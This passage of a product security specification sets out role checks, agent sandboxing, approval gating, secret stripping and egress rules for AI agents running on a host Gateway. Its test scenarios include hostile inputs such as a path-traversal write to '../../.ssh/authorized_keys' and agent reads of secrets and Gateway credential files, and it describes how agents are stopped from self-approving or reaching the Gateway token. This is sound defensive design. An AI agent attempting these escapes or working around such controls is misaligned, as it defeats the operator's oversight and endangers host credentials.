## ADDED Requirements

### Requirement: Trust model
One Gateway SHALL be one trust domain belonging to one operator: every paired device acts with the operator's authority within the role it was given, and the product SHALL NOT offer a shared multi-tenant Gateway. OpenClaw states that its operator scopes are not a per-person isolation boundary, therefore the product does not use them as one: no device holds an OpenClaw scope, token or pairing, a device reaches the host only on channel P, and every boundary between roles and between session owners is enforced by JAgentChill Server before it calls the Gateway over its gateway link (design D7, D25); the Gateway is a child process of the server, bound to loopback, with the server as its only client. The pairing UI and the documentation SHALL state "Pair only devices you trust: paired devices can see the projects on this host". Sharing a session or a project with another person is done only by pairing that person's device with role `viewer` or `editor` (`chat-agent.Session share control`); the product has no tunnel link, guest code or public session URL. The product DOES have the ability to run commands on the host (CLI agent runtimes, workspace agents, terminals); it is controlled by these layers, each owned by the named requirement: (1) network — only `/jagentchill/` paths are reachable from a network, the Gateway's native port is loopback-only (`server-api.Native Gateway port isolation`, `server-api.Product listeners and path restriction`); (2) device authentication — the signed handshake and per-request signatures (`device-pairing-signing.Channel P handshake`); (3) device role and scope (`security-privacy.Device roles and privileged actions`); (4) session ownership and visibility (`server-api.Session ownership and visibility`); (5) agent class — creative agents by default, workspace agents by privilege (`security-privacy.Agent classes`); (6) permission mode and server-resolved approvals with a known resolver (`security-privacy.Workspace agent safeguards`, `server-api.Approval and question resolution`); (7) the run profile (`platform-skeleton.Gateway run profile`). The Gateway shared token and the host OS account that runs the Gateway are equivalent to role `admin` and are outside the role model: someone who controls the host account controls the host. `docs/product/SECURITY.md` SHALL describe these layers, the assets protected (device keys, Gateway key, provider secrets, project and media content, session transcripts, the host itself) and the threats not addressed (a malicious paired admin, a compromised host OS account, a compromised device operating within its own role). [NEW]

#### Scenario: Warning shown before first pairing
- **WHEN** an admin opens "Pair a device" for the first time on a host
- **THEN** the trust statement is shown above the offer and remains visible on every subsequent visit

#### Scenario: Security document covers each layer
- **WHEN** the documentation check runs
- **THEN** `docs/product/SECURITY.md` exists and contains the headings "Trust boundaries", "Device roles", "Session ownership", "Agent classes", "Protected assets", "Out of scope" and "Reporting a vulnerability"

#### Scenario: Role boundary does not rest on OpenClaw scopes
- **WHEN** the security test `role-boundary` drives an `editor` and a `viewer` device through every method of the protocol package and every core method name as a wire method
- **THEN** every call outside the device's role or session rights is refused by the server and none reaches the core

### Requirement: Device roles and privileged actions
Privileged actions SHALL be gated by the device roles of design D25, enforced in the handler of every method and route by the scopes of `device-pairing-signing.Device roles and scopes` together with `server-api.Session ownership and visibility`; devices hold no OpenClaw scope, so there is no second path that bypasses a role. The permission model is:

| Action | `viewer` | `editor` | `admin` |
|---|---|---|---|
| View projects, scripts, workflows, runs, media; write review comments | yes | yes | yes |
| Edit and sync; run workflows, film steps and generation within budgets; export | no | yes | yes |
| Read the transcript and project artifacts of a creative-class session shared with the host (`access: "host"`) | yes | yes | yes |
| Read another owner's private creative session | no | no | yes |
| Read a workspace-class session: transcript, files, diff, terminal output, runtime configuration | no | only sessions it owns | yes |
| Read host logs, the host diagnostics bundle, secret hints (`last4`), the audit log | no | no | yes |
| Prompt, steer, abort or patch a creative-class session shared with the host | no | yes | yes |
| Create a workspace-class session; prompt, steer, abort or patch one | no | only its own, and only while `agents.allowWorkspaceAgentsForEditors` is on | yes |
| Prompt or approve in another owner's workspace-class session | no | never | yes |
| Answer an approval of kind `out-of-project`, `cost`, `publish`, a plan or a question | no | yes, in sessions it can act in | yes |
| Answer a host-execution approval (commands, terminal keys, scripts, git mutations, writes outside the working directory), a skill-write approval, an unattended-mode request | no | no | yes — enforceable because the server resolves approvals and knows the resolver |
| Terminals, workspace scripts, git mutations, repository trust (`jagentchill.host.exec`) | no | no | yes |
| Configure runtimes, providers, endpoints, budgets, ORC, teams, skills, connectors, network listeners, host settings (`jagentchill.config.write`); secrets (`jagentchill.secrets.manage`); devices, pairing, audit (`jagentchill.devices.manage`) | no | no | yes |

Every action that needs the core's administrator scope SHALL go through `server-api.Narrow admin proxies`, which checks the role before calling the Gateway over the gateway link (gated by spike S12). The host setting "Allow workspace agents for editors" (`agents.allowWorkspaceAgentsForEditors`, default false, changed only with `jagentchill.config.write`) is the only setting that widens what an `editor` can do, and it never lets an editor into a session it does not own nor answer a host-execution approval. [NEW]

#### Scenario: Editor configures a provider
- **WHEN** an `editor` device calls a provider configuration method
- **THEN** the response error code is `SCOPE_DENIED` and no core method is called

#### Scenario: Viewer starts a turn
- **WHEN** a `viewer` device tries to send a chat message
- **THEN** the composer is disabled with the role tooltip, a direct `jagentchill.chat.send` returns `SCOPE_DENIED`, and the device has no other connection that accepts a turn

#### Scenario: Viewer asks for host logs
- **WHEN** a `viewer` device requests `GET /jagentchill/v1/diagnostics/bundle` or the transcript of a workspace-class session
- **THEN** the first answers HTTP 403 `SCOPE_DENIED` with `requiredScope` `jagentchill.config.write` and the second answers `NOT_FOUND`

#### Scenario: Editor in an admin's workspace session
- **WHEN** an `editor`, with the workspace-agent setting on, tries to send a prompt to, or allow a command in, a workspace-class session an `admin` created
- **THEN** both calls are refused and the command does not run

#### Scenario: Admin action is proxied
- **WHEN** an `admin` device opens a terminal
- **THEN** the device calls `jagentchill.terminal.open` on channel P and the server, after its role and scope checks, starts the shell in its own PTY worker; no Gateway method is called and no OpenClaw scope is involved

### Requirement: Agent classes
Every agent session SHALL belong to exactly one of two classes. A **creative agent** runs a `jagentchill-*` persona (`jagentchill-director`, `jagentchill-screenwriter`, `jagentchill-editor`, `jagentchill-producer` and the other bundled personas) whose effective tools are the server's `jc_*` tools only, as constrained by `security-privacy.Agent tool sandbox`; it is the class of every session unless a privileged creation path is used, and it is the default agent of the run profile. A **workspace agent** runs a CLI or ACP runtime, or the built-in runtime with file and command tools, in a workspace directory; it SHALL be creatable only by a device with role `admin`, or by an `editor` while `agents.allowWorkspaceAgentsForEditors` is on, it is owned by the device that created it and can be driven only by that owner and by `admin` devices (`server-api.Session ownership and visibility`), and its child agents inherit at most its class (`multi-agent-orchestration.Agent classes and creation privileges`). An external CLI started by a workspace agent runs as the Gateway's OS user with that user's vendor login and is outside OpenClaw's sandbox; the UI SHALL say so in the creation dialog ("This agent can run commands and change files on <host name> as <user>"). The class of a session SHALL be shown as a chip ("Creative" or "Workspace") in the session header and SHALL NOT change after creation except through `agent-runtimes.Switch runtime operation`, which re-checks the privilege of the device that asked (an agent can never change an agent's class: `multi-agent-orchestration.Tools jc_agent_set_mode and jc_agent_set_model` answers `AGENT_CLASS_DENIED`); a creative session on a CLI or ACP runtime is admitted only under `agent-runtimes.Creative sessions on CLI and ACP runtimes`. [NEW]

#### Scenario: Default session is creative
- **WHEN** an `editor` starts a new chat from the home composer
- **THEN** the session runs a `jagentchill-*` persona and its effective tool list contains no command, file-system, browser or network-fetch tool of the core

#### Scenario: Editor requests a workspace agent with the setting off
- **WHEN** an `editor` device asks to create a session on a CLI runtime while "Allow workspace agents for editors" is off
- **THEN** the request is refused with `SCOPE_DENIED` and `details.requiredRole` `admin`

#### Scenario: Editor with the setting on
- **WHEN** an admin turned the setting on and the `editor` repeats the request in an existing workspace
- **THEN** the session is created, shows the "Workspace" chip, and the creation dialog displayed the host and user sentence

#### Scenario: Creative agent cannot spawn a workspace child
- **WHEN** a creative agent asks to create a child on a CLI runtime
- **THEN** the call fails with `AGENT_CLASS_DENIED`

### Requirement: Agent tool sandbox
Every creative agent SHALL run with this tool policy, written to `agents.entries.<id>.tools` in the Gateway configuration by the server (the run profile) and backed by a second line at the server: `profile: "minimal"`; `allow` = the `jc_*` tools of that persona from the index of `agent-editing-tools.Tool naming and families` plus the session and messaging tools the persona needs; `deny` = the core groups for command execution and processes, core file tools (`ls`, `read`, `write`, `edit`, `apply_patch`), the core `terminal` tool, browser control, canvas, node invocation, web fetch and web search, and elevated mode (`tools.elevated` disabled). The second line is the one of `server-api.Run initiator attribution and host-execution gating`: the server denies every native approval request of a creative-class session, aborts a creative-class run in which a tool-call event of a denied tool appears, and restores the policy at the next run-profile check — so an altered policy does not give a creative agent a usable core tool, and every `jc_*` tool is checked against the agent class at the server's tool endpoint. File access for a creative agent exists only through `jc_workspace_list`, `jc_workspace_read` and `jc_workspace_write`, which resolve paths under `<dataDir>/workspaces/<projectId>/` of the project bound to the session, after `realpath`, and reject escapes through `..` or symbolic links with `fs/outside-workspace`; the `secrets/` directory and every path outside that folder are unreachable. A tool call that would act outside the current project — permanent deletion of a project or media asset, sending project-derived content to a provider lacking consent, spending above an approval threshold, importing from a URL, changing host settings — SHALL require an explicit approval, held and resolved by the server with the resolving device recorded (`server-api.Approval and question resolution`) and shown through `chat-agent.Permission request cards`, under the rules of `agent-editing-tools.Approval for out-of-project effects`, and SHALL be denied with `APPROVAL_TIMEOUT` when no approval is given within the approval timeout of 1 800 000 ms owned by `generation-providers.Approval thresholds and spending caps`. A contract test SHALL enumerate the effective tools of every `jagentchill-*` agent with the Gateway's `tools.effective` and fail when one is outside the allow-list. [NEW]

#### Scenario: Creative agent tries to run a shell command
- **WHEN** a creative agent attempts to call an exec tool
- **THEN** the call is refused by tool policy, the session timeline shows "Tool not available", and nothing runs on the host

#### Scenario: Path escape
- **WHEN** a creative agent asks `jc_workspace_write` to write `../../.ssh/authorized_keys`
- **THEN** the tool returns an error with code `fs/outside-workspace` and no file is written

#### Scenario: Symlink escape
- **WHEN** the project workspace contains a symbolic link pointing outside it and a creative agent reads through it
- **THEN** the read is refused with `fs/outside-workspace`

#### Scenario: Permanent delete needs approval
- **WHEN** an agent calls a tool that permanently deletes a media asset
- **THEN** an approval request is shown to the user and the asset is deleted only after "Approve"; with no answer in 30 minutes the tool result is `APPROVAL_TIMEOUT`

#### Scenario: Effective tools contract test
- **WHEN** the run profile is changed so that `jagentchill-editor` gains the core `exec` tool
- **THEN** the contract test `creative-agent-tools` fails and names the agent and the tool

### Requirement: Workspace agent safeguards
A workspace agent SHALL act inside its workspace directory under the session's `permissionMode`, the runtime's own mode and exec approvals, as mapped by `agent-runtimes.Runtime modes catalogue`. The default mode of a new workspace session SHALL require approval for commands and for writes outside the workspace. Every such approval is held and resolved by the server (`server-api.Approval and question resolution`): it is of kind `host-exec`, can be answered only by a device with role `admin` (scope `jagentchill.host.exec`) that can act in the session, records the resolving device, and times out after 1 800 000 ms as denied; an `editor` sees the card read-only with "Waiting for an admin device". A turn of a workspace-class session whose initiator was not permitted to drive it has its host-execution tool calls denied by the server — at the Gateway approval request for native tools and at the tool endpoint for `jc_*` tools — whatever the mode (`server-api.Run initiator attribution and host-execution gating`), so a prompt that reaches the session by any other path cannot execute. An unattended mode (a runtime's no-prompt mode, `permissionMode: "full"`, or ACP approve-all) SHALL be entered only as defined by `agent-runtimes.Unattended modes and their warning`: per session, by an `admin`, after an explicit confirmation, never as a remembered default, shown with a persistent "Unattended" badge in the dangerous tier on every device, audited, and cleared by a runtime switch, fork, import or a restart of the Gateway or of the server; while a session is unattended only its owner and `admin` devices can start turns in it. The protected paths are `<dataDir>/secrets/`, `<dataDir>/tls/`, `<dataDir>/config.json`, the server database, `<dataDir>/run/`, and `<dataDir>/gateway-state/` with the OpenClaw configuration, credential files and device-pairing store in it. The server has no hook inside the Gateway, so it SHALL protect them, for every agent class and whatever the mode, with these layers: (a) every `jc_*` tool that takes a path resolves it with `realpath` and refuses a protected path at the tool endpoint with `fs/protected-path`; (b) the server writes `tools.fs.workspaceOnly: true` (and the workspace-only setting of `apply_patch`) for every agent, so that OpenClaw's native file tools cannot leave the session's workspace directory, and a workspace whose directory contains, equals or lies inside `<dataDir>` — other than a project workspace under `<dataDir>/workspaces/` — is refused at creation; (c) a Gateway approval request whose command line, working directory or path argument names a protected path is denied by the server with `fs/protected-path` and audited, whoever answers approvals otherwise; (d) the files are owner-only and no secret is in the environment of a process an agent can start (`security-privacy.Environment stripping for child processes`). Layers (b) and (c) matter most for `<dataDir>/gateway-state/openclaw.json`: it holds the Gateway token and the tool endpoint secret (`server-api.Gateway secrets`), and a local process that presents that token to the Gateway's loopback port is an operator client that is able to answer approvals itself. Layer (b) is OpenClaw's setting for OpenClaw's own file tools; whether the native read and write tools of each CLI and ACP runtime are held by it, or raise an approval request that layer (c) can deny, in every non-unattended mode, is measured per runtime by spike S21 (`diagnostics-quality.Gating spikes`). A runtime for which it is not, or not yet, recorded as held SHALL be offered for workspace-class sessions only to `admin` owners, its sessions are never readable or drivable by an `editor`, and its creation dialog states "This runtime can read files outside the workspace, including this host's own configuration". As a further line, where the pinned Gateway reports its connected clients to an operator client (recorded by spike S21; without it the doctor states "Gateway clients cannot be listed on this OpenClaw version"), the security audit collector SHALL list at every run-profile check each operator client other than the server's own link as `warn gateway-foreign-client` with its client name and connect time — the host operator's own `openclaw` command is such a client and is expected only while the operator runs it — and Host settings SHALL offer an `admin` "Rotate host secrets" beside the finding, which generates a new Gateway token and tool endpoint secret and restarts the Gateway (`server-api.Gateway secrets`). A command of a session in an unattended mode raises no approval request, so layer (c) does not see it: such a command runs with the file access of the host account, which is why an unattended mode is granted per session by an `admin` only and why the trust model treats host execution as the host operator's authority (`security-privacy.Trust model`). `tools.sessions.visibility` and `tools.agentToAgent` follow the stored preset of `multi-agent-orchestration.Who-can-call-whom policy presets`, whose initial value limits an agent to its own tree, so an agent cannot read other trees' transcripts; selecting the preset `all` SHALL be possible only for an `admin` (scope `jagentchill.config.write`) after a confirmation dialog that states "Agents will be able to read and message every agent session on this host", SHALL write a `security` audit record with the old and new value, and SHALL be listed by the doctor and the security audit collector as `warn` for as long as it is selected. [NEW]

#### Scenario: Command needs approval by default
- **WHEN** a workspace agent in the default mode wants to run `rm -rf build`
- **THEN** a `host-exec` approval is shown, nothing runs before an `admin` device chooses "Allow", and the audit record names that device

#### Scenario: Editor cannot self-approve
- **WHEN** an `editor` that owns a workspace-class session (setting on) prompts "run the build" and then tries to allow the resulting command approval
- **THEN** the resolve call answers `SCOPE_DENIED` with `details.requiredScope` `jagentchill.host.exec` and the command waits for an admin

#### Scenario: Unattended needs an admin confirmation
- **WHEN** an `editor` tries to switch a workspace session to the unattended mode
- **THEN** the control is disabled with "Admin devices only" and a direct call returns `SCOPE_DENIED`

#### Scenario: Secrets directory is always blocked
- **WHEN** a workspace agent in unattended mode calls a file tool on `<dataDir>/secrets/PROVIDER_FAL_API_KEY`
- **THEN** the call fails — a `jc_*` tool at the tool endpoint with `fs/protected-path`, a native file tool because the path is outside the workspace — nothing is read, and an audit record is written

#### Scenario: Unattended cleared by restart
- **WHEN** the Gateway restarts while a session is in unattended mode
- **THEN** after the restart the session is back in its default mode and the badge is gone

#### Scenario: Selecting the widest call policy
- **WHEN** an admin selects the who-can-call-whom preset `all` and confirms the dialog
- **THEN** the preset is stored, an audit record with the old and new value exists, and `jagentchill doctor` reports `warn agent-call-policy: all`
- **AND** an `editor` device that attempts the same change receives `SCOPE_DENIED`

#### Scenario: Command that names a protected path
- **WHEN** a workspace agent in the default mode asks to run `cat` on a file under `<dataDir>/gateway-state/`
- **THEN** the server denies the Gateway approval request with `fs/protected-path` without showing any card through which it would be allowed, and an audit record is written

#### Scenario: Runtime whose own file tools are not held
- **WHEN** the S21 record of a CLI runtime says its native read tool returns a file under `<dataDir>/gateway-state/` in a `guarded` session without any approval request, and an `editor` with the workspace-agent setting on asks for a workspace session on it
- **THEN** the request is refused with `SCOPE_DENIED` and `details.requiredRole` `admin`, and an `admin` who creates one sees the sentence about files outside the workspace

#### Scenario: Foreign operator client on the Gateway
- **WHEN** a process on the host other than the server connects to the Gateway port with the Gateway token as an operator client
- **THEN** on a Gateway that lists its clients the next run-profile check reports `warn gateway-foreign-client` naming the client, and after an `admin` chooses "Rotate host secrets" the Gateway restarts with a new token and the foreign client can no longer connect with the old one

#### Scenario: Workspace over the data directory
- **WHEN** an admin adds a workspace whose path is `<dataDir>` or a parent of it
- **THEN** the request is refused and no agent session can have a working directory from which the protected paths are inside the workspace

### Requirement: Repository trust gate
Commands that originate from a repository or folder — setup, teardown, service and script commands of the per-repository configuration file, and git hooks triggered by git actions the server runs — SHALL run on the host only after an `admin` confirmed "Trust commands from this folder" for the exact SHA-256 of the command-bearing sections, as implemented by `workspaces-terminal.Per-repository configuration file` and `workspaces-terminal.Worktree setup and teardown execution`. A changed hash SHALL ask again and show a unified diff of the commands. An untrusted workspace SHALL still be browsable and editable, and agents in it SHALL be told that setup did not run. Trust decisions are stored on the host, audited, listed under host settings with a "Revoke" action, and never granted by an agent, an automation or a device below `admin`. Cloning or opening a folder SHALL never run a command from it. [NEW]

#### Scenario: New repository
- **WHEN** an admin opens a folder whose configuration file declares a setup command
- **THEN** no command runs until the admin confirms the trust prompt, which shows the commands

#### Scenario: Commands changed after trust
- **WHEN** a pull changes the setup command of a trusted repository
- **THEN** the next run asks again and shows a diff of the old and new commands

#### Scenario: Agent cannot grant trust
- **WHEN** an agent calls a tool that would start an untrusted repository's script
- **THEN** the call fails with a `workspace/*` error naming the missing trust and no command runs

### Requirement: Terminal default-off
The host terminal SHALL be off on every new Gateway: the run profile keeps OpenClaw `gateway.terminal.enabled` false at all times — also while the product setting `terminal.enabled` is on, because the product terminal is the server's own PTY worker and never OpenClaw's (`platform-skeleton.Gateway run profile`), and the core `terminal` tool and `exec {pty: true}` are denied in every agent entry (`gateway.cliAgents.enabled` is not a terminal switch: it follows "at least one CLI runtime enabled", because importing and running CLI sessions does not need the terminal), and every terminal method answers `terminal/disabled`. Turning it on requires role `admin` (scope `jagentchill.host.exec`) and the acknowledgement dialog of `workspaces-terminal.Terminal enablement and host-shell warning`, is audited, and is offered on a headless host through `jagentchill terminal enable`. A terminal is an unsandboxed shell of the Gateway's OS user; it SHALL be reachable only through the admin proxy `jagentchill.terminal.*` on channel P, never by a core call from a device (a device can make none), and its shell environment SHALL be stripped as in `security-privacy.Environment stripping for child processes`. Agents SHALL be able to type into a terminal only when they are workspace agents and the terminal's owner allowed it (`workspaces-terminal.Agent terminal tools`). [NEW]

#### Scenario: Terminal off by default
- **WHEN** an admin calls `jagentchill.terminal.open` on a new Gateway
- **THEN** the response error code is `terminal/disabled`

#### Scenario: Enabling requires acknowledgement
- **WHEN** an admin turns the terminal on
- **THEN** the blocking dialog is shown and "Enable terminal" stays disabled until the acknowledgement checkbox is ticked

#### Scenario: Editor with the terminal enabled
- **WHEN** the terminal is enabled and an `editor` calls `jagentchill.terminal.open`
- **THEN** the response error code is `SCOPE_DENIED` with `details.requiredScope` `jagentchill.host.exec`

### Requirement: Environment stripping for child processes
Every process the server starts on the host — the Gateway child, terminals, workspace scripts and services, FFmpeg, the render host, the tailnet ingress bridge, the archify exporter, git and forge CLIs — and, through the Gateway's inherited environment and the launch wrapper of `agent-runtimes.Launch environment`, every CLI and ACP runtime the Gateway starts, SHALL receive an environment from which these are removed: every variable matching `OPENCLAW_*TOKEN*`, `OPENCLAW_GATEWAY_*` or `JAGENTCHILL_*`; every variable whose name equals the name of a stored secret; every variable matching `*_API_KEY`, `*_SECRET`, `*_TOKEN` or `*_PASSWORD` that was not explicitly listed for that process by an admin-defined profile; and the parent-agent markers listed by `agent-runtimes.Launch environment`. A process SHALL receive a provider credential only when its admin-defined profile names the secret (`{ secret: "<NAME>" }`), in which case the value is injected for that process alone. The Gateway child is started with an environment already stripped by these rules, to which the server adds only the non-secret variables of `server-api.Gateway supervision and lifecycle` (`OPENCLAW_STATE_DIR`, `OPENCLAW_CONFIG_PATH` and the four embedding switches); the Gateway token, the link identity and the tool endpoint secret are never in any process environment (`server-api.Gateway secrets`). The product terminal is the server's own PTY worker and never OpenClaw's (`platform-skeleton.Gateway run profile`, item 7), so a terminal's shell is a child of the server and receives the stripped environment directly; spike S15 SHALL verify on each host operating system that the shell's environment holds none of the removed variables. The Gateway token is given to the Gateway only in its owner-only configuration file precisely because everything the Gateway starts — agent CLIs and the commands they run — inherits the Gateway's environment (`docs/decisions/0002-own-server-gateway-sidecar.md` row 14). [NEW]

#### Scenario: Terminal does not see the Gateway token
- **WHEN** an admin runs `env` in a host terminal
- **THEN** the output contains no variable matching `OPENCLAW_GATEWAY_*`, `JAGENTCHILL_*` or the name of a stored secret

#### Scenario: Script with a declared secret
- **WHEN** a workspace script profile lists `{ secret: "PROVIDER_FAL_API_KEY" }` and the script runs
- **THEN** that script's process has the variable and a terminal opened at the same time does not

#### Scenario: Render host environment
- **WHEN** the environment of a running render-host process is inspected
- **THEN** it contains none of the removed variable classes

#### Scenario: Gateway child environment
- **WHEN** the environment of the supervised Gateway process is read on macOS, Windows and Linux while the server was started with `ANTHROPIC_API_KEY` and `JAGENTCHILL_BOOTSTRAP_DEVICE_PUBLIC_KEY` set
- **THEN** it contains neither variable, no `OPENCLAW_GATEWAY_TOKEN` and no variable whose value equals a stored secret, the Gateway token or the tool endpoint secret

### Requirement: Unattended operation safeguards
Work that runs with nobody present — automation runs, scheduled workflow triggers, team runs in Autonomous mode, loops and heartbeats — SHALL obey these rules: approvals follow the common approval policy object of `multi-agent-orchestration.Common approval policy` (`human`, `agent` or `auto`); two kinds of waiting are distinguished (`multi-agent-orchestration.Unattended behaviour of approvals`): a policy sign-off (an `approval` node, a script or plan review, a proposal waiting for acceptance or a plan waiting for approval in a session whose mode is `edit` or `plan`, a hand-off to a person) SHALL park the run in a waiting state without a time limit and raise a notification, never proceed; a cost prompt, a provider-consent prompt and a tool-permission prompt (including host-execution approvals) SHALL fail the step after 1 800 000 ms with `APPROVAL_TIMEOUT` (consent: `PERMISSION_DENIED`) when nobody answers, and SHALL never be answered by an agent; an unattended run SHALL NOT enter an unattended permission mode unless an `admin` pre-approved it for that automation (scope `jagentchill.config.write`, audited); budgets of `generation-providers.Budgets with hard stop` apply and block before the call that would overrun, a hard-stop budget has no bypass for any caller, and only an `admin` can raise a budget; rendering uses the render host and a missing render host ends the export step `skipped` with reason `no_renderer`. An agent SHALL NOT be able to enable a schedule or webhook trigger, pre-approve an automation, raise a budget, grant repository trust, enable the terminal, enable a public route, change a device role or write a secret: these need a device action with the stated scope. Webhook payloads and watched-folder contents are untrusted input and are handled under the rules of `agent-editing-tools.Untrusted content handling`. [NEW]

#### Scenario: Approval needed with nobody present
- **WHEN** a scheduled workflow reaches an approval node whose policy is `human` at 03:00 with no device connected
- **THEN** the run is parked in `waiting_approval`, a notification is raised, and nothing after that node runs

#### Scenario: Cost prompt with nobody present
- **WHEN** an unattended run reaches a generation whose estimated cost needs a person's approval and no device answers for 30 minutes
- **THEN** that step fails with `APPROVAL_TIMEOUT`, nothing is spent, and the run follows its owner's failure handling

#### Scenario: Agent tries to enable a trigger
- **WHEN** an agent authoring a workflow sets a schedule trigger to enabled
- **THEN** the trigger is stored disabled with the note "Needs to be enabled by a person" and no automation record becomes active

#### Scenario: Unattended run without pre-approval
- **WHEN** an automation without an admin pre-approval starts a workspace agent session
- **THEN** the session runs in the default mode, a command that needs approval raises a `host-exec` approval for admin devices, and with no answer that step fails with `APPROVAL_TIMEOUT` after 30 minutes

### Requirement: Local-first data residency
Projects, media, scripts, workflows, transcripts, captions, generated assets, agent sessions and settings SHALL be stored only on the user's devices and on Gateways the user paired. The software SHALL send user content to a third party only when the user or an agent they started invokes a feature that names an external provider, endpoint or connector, and then only the inputs that feature needs, under the consent rule of `security-privacy.Provider data disclosure and consent`. There SHALL be no JAgentChill-operated server receiving user content, and the app SHALL function with all external network access blocked except for features that state they need a provider. Every host the software can contact is a row of `security-privacy.Network egress control`. [NEW]

#### Scenario: Offline editing session
- **WHEN** a device with no network creates a project, imports media, edits, adds on-device captions with an already downloaded model and exports
- **THEN** every step succeeds and no error mentions connectivity

#### Scenario: Content leaves only on an explicit provider action
- **WHEN** network traffic from the Gateway is captured during a session with no generation, provider transcription, agent turn or search action
- **THEN** no request body contains project, media or prompt content

### Requirement: No outbound telemetry
No JAgentChill client, server or build script SHALL include an analytics, crash-reporting, advertising, session-replay, bot-protection or fingerprinting SDK, and none SHALL transmit usage events, device identifiers, crash reports or logs to any remote endpoint. The classic analytics and bot-protection hooks SHALL NOT be ported. Crash reports, logs, feedback and performance measurements SHALL stay on the device or Gateway and leave only through a user-initiated diagnostics export (`diagnostics-quality.Diagnostics bundle`). A CI check SHALL fail when a dependency from a maintained denylist of telemetry packages (at least: `@sentry/*`, `posthog-*`, `@vercel/analytics`, `mixpanel*`, `@amplitude/*`, `firebase-analytics`, `expo-firebase-analytics`, `databuddy`, `botid`) appears in any JAgentChill package, and upstream OpenClaw telemetry options SHALL be left disabled in the run profile. Update checks and over-the-air manifest requests carry no install, device or Gateway identifier (`updates-distribution.Update check privacy`). [PORT W-016] [NEW]

#### Scenario: Idle network capture
- **WHEN** the desktop app, its Gateway and the web build run idle for 30 minutes with update checks disabled and push disabled
- **THEN** no outbound connection is made to any host outside the paired Gateway

#### Scenario: Telemetry dependency added
- **WHEN** a pull request adds `@sentry/react-native` to `apps/app`
- **THEN** the CI job `jagentchill-policy` fails with `telemetry dependency not allowed: @sentry/react-native`

#### Scenario: Crash stays local
- **WHEN** the app crashes
- **THEN** a crash record is written to local storage and no network request is made on the next launch as a result

### Requirement: Network egress control
This requirement owns the single list of external hosts of the product, the table "External hosts"; no other capability SHALL add a host outside it. Each row has: who connects, purpose, default, data sent, and the setting that disables it.

| Host class | Who connects | Purpose | Default | Data sent | Disabling setting |
|---|---|---|---|---|---|
| Update feed host | desktop app; Gateway (version notice) | update check and download | on | none beyond the request path | "Check for updates automatically" |
| Over-the-air manifest host (self-hosted path of the feed host) | mobile app | JavaScript and asset updates | on | protocol version, platform, runtime version, current update id | same |
| Content host (exactly one static download host; base URL `network.contentHostBaseUrl`, initial value the publisher's content host, replaceable by an operator's own `https` host; every file pinned by SHA-256 in the app manifest) | clients and Gateway | font files of the online font catalogue, on-device and host model files (transcription, cutout, tracking, stem separation and the other models of `ai-editing-tools.Model manifest`), and on phones and tablets the 32 on-demand music tracks of `audio-editing.Bundled sound pack`; the inference runtime itself is never fetched from this host — it ships inside the app and the server (`ai-editing-tools.Inference runtime`) | ask on first use per device and per host, naming the host | file path | the two per-device switches "Download additional fonts" and "Download on-device models" of `settings-preferences.Privacy page` (the same stored values as on Personal ▸ Performance); on a host, the content host row of the Network activity table |
| OpenH264 download host (Cisco's official binary host) | Gateway only | one download of the encoder library during host setup, never at export time (`server-api.Host encoder policy and codec table`) | off until an admin accepted the OpenH264 notice (desktop first-run dialog, host CLI, or `JAGENTCHILL_ACCEPT_OPENH264=1`) | file path | not accepting; `jagentchill encoders remove openh264`; the row's switch in the host's Network activity table |
| Tailscale coordination and relay (DERP) servers of the user's tailnet (or the user's self-hosted coordination server) | the Gateway's tailnet ingress bridge; the embedded tailnet node of the mobile app; the tailnet proxy of the desktop app | tailnet membership and WireGuard-encrypted transport between the user's own devices and host | off until the tailnet level is enabled on the host, or a user signs a client in | node keys, connection metadata and encrypted packets; no product content in clear | the "Tailnet" level of Network access (host) and "Sign out of Tailscale" (client) |
| Push service | Gateway only | mobile push delivery | off | `{ kind, opaqueId }` — the notification kind of `notifications.Notification event catalogue` and an opaque id — and the push token; never a title, body, project, session or device name | `push.enabled` and the per-device push switch |
| Provider hosts (one row per enabled LLM or media provider; the host names come from the bundled OpenClaw provider plugin or the adapter definition of `generation-providers.Provider adapter contract`, never from a client) | Gateway only | model and generation calls | off until the provider is connected | the inputs of the call | the provider's enable switch |
| Endpoint hosts (one row per shared endpoint record of `agent-runtimes.Shared endpoint record`: label, host and port; an endpoint created from a preset of `agent-runtimes.Endpoint presets` — including the kinds `media-endpoint` (lip-sync, voice design, sound effects) and `stock-source` (stock video and images) — is such a record, used with the admin's own key, and gets its row when it is enabled; the product ships no vendor-named media or stock adapter, so no other row exists for these services) | Gateway only | model endpoint, proxy, router, aggregator, media generation endpoint, stock media search | off until the endpoint is enabled | prompts, attachments and tool results of sessions that use it; the inputs of the media call for media endpoints; search text for stock sources | the endpoint's enable switch |
| Provider sign-in hosts (OAuth and device-code hosts of a provider) | Gateway; the user's browser for the consent page | provider login | only during a login an admin started | OAuth parameters | not connecting that provider |
| Freesound API and preview hosts | Gateway only (previews are proxied) | sound search | off until a Freesound key is stored | query text and filters | removing the key |
| Connector hosts (`google-drive`, `dropbox`, `youtube`, `tiktok` API and OAuth hosts) | Gateway; the user's browser for consent | import and publishing | off | files and metadata the user selected | `connectors.enabled` and each connector's switch |
| Skill sources (ClawHub, npm registry, git hosts an admin added) | Gateway only | skill browse, install and update | browse off until an admin opens the catalogue | package names and versions | the source's enable switch |
| User-typed URLs (import from URL) | Gateway, or the client when no host is paired | fetch one resource | per request | the request | not using the feature |

The server SHALL make every outbound request through one egress module that enforces the enabled rows, applies `security-privacy.Outbound endpoint rules`, and records `{ time_ms, hostClass, host, purpose, bytesOut, bytesIn, status }` in a rolling log of the last 5 000 requests, viewable under Privacy → Network activity (scope `jagentchill.config.read`). A request to a host whose row is absent or disabled SHALL fail with `EGRESS_BLOCKED` and `details.host`, without a DNS lookup for that name. `network.offlineMode` true SHALL block all egress of the server, make push "unavailable", and make provider-dependent actions show "Offline mode is on" with a link to the setting. Clients SHALL connect only to paired Gateways (and, on web, the origin that served the app) plus the client rows of this table that are enabled on that device; clients never call Google Fonts, model hubs, Freesound, providers or connectors directly. Each client SHALL route its own requests through a client egress module with the same blocking behaviour and a local activity list. The content host works the same way on every platform: the first download on a device (and the first on a host) shows a prompt naming the host and the item ("Download <name> (<size>) from <host>?", actions "Download", "Always allow from this host", "Cancel"); nothing is requested before consent; a downloaded file whose SHA-256 differs from the manifest is deleted and reported as `ai/model-verification-failed` or, for a font, as a failed font download; and `docs/product/CONTENT-HOST.md` documents how to mirror the release's content bundle on an operator's own static host and set `network.contentHostBaseUrl` (scope `jagentchill.config.write`; clients read the value from their paired host and use the built-in value when no host is paired). Biometric indexes never leave a library (`security-privacy.Biometric grouping is opt-in`). The table lists outbound hosts only; the 